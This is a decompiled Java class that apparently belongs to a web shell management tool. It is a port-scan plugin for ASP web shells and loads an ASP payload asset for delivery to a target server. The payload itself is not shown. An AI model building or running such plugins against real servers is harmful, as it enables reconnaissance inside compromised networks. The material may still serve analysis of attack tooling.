/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.asp;

import core.annotation.PluginAnnotation;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.PortScan;
import util.functions;

@PluginAnnotation(payloadName="AspDynamicPayload", Name="PortScan", DisplayName="\u7aef\u53e3\u626b\u63cf")
public class APortScan
extends PortScan {
    private static final String CLASS_NAME = "PortScan";

    @Override
    public byte[] readPlugin() throws IOException {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.asp", CLASS_NAME));
        return functions.readInputStreamAutoClose(inputStream);
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }
}

